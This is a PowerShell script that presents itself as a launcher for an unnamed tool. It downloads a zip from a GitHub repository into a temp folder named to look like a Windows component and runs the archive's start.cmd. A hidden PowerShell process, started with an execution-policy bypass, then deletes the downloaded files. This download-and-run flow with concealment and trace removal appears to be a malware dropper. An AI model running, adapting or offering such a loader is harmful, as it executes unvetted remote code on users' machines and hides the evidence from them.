$ErrorActionPreference = "Stop"

$repo = "https://github.com/madsbervell55-cyber/x/archive/refs/heads/main.zip"
$id = [guid]::NewGuid().ToString()
$temp = Join-Path $env:TEMP "windows32_$id"
$zip = Join-Path $env:TEMP "windows32_$id.zip"

try {
    Write-Host "Downloading tool..." -ForegroundColor Cyan

    New-Item -ItemType Directory -Path $temp -Force | Out-Null
    Invoke-WebRequest -Uri $repo -OutFile $zip

    Write-Host "Extracting..." -ForegroundColor Cyan
    Expand-Archive -Path $zip -DestinationPath $temp -Force

    $folder = Get-ChildItem $temp -Directory | Select-Object -First 1
    $startBat = Join-Path $folder.FullName "start.cmd"

    if (-not (Test-Path $startBat)) {
        throw "start.bat was not found."
    }

    Write-Host "Starting tool..." -ForegroundColor Green

    # Start the tool independently
    $process = Start-Process `
        -FilePath "cmd.exe" `
        -ArgumentList "/c `"$startBat`"" `
        -WorkingDirectory $folder.FullName `
        -PassThru

    # Create a separate cleanup process.
    # This continues even if this PowerShell window is closed.
    $cleanup = @"
Start-Sleep -Seconds 2
try {
    Wait-Process -Id $($process.Id) -ErrorAction SilentlyContinue
} catch {}
Start-Sleep -Seconds 2
Remove-Item -Path "$temp" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "$zip" -Force -ErrorAction SilentlyContinue
"@

    Start-Process powershell.exe `
        -WindowStyle Hidden `
        -ArgumentList "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", $cleanup

    Write-Host "Tool started successfully." -ForegroundColor Green
    Write-Host "You can close this PowerShell window." -ForegroundColor Gray

}
catch {
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
    Remove-Item $temp -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item $zip -Force -ErrorAction SilentlyContinue
}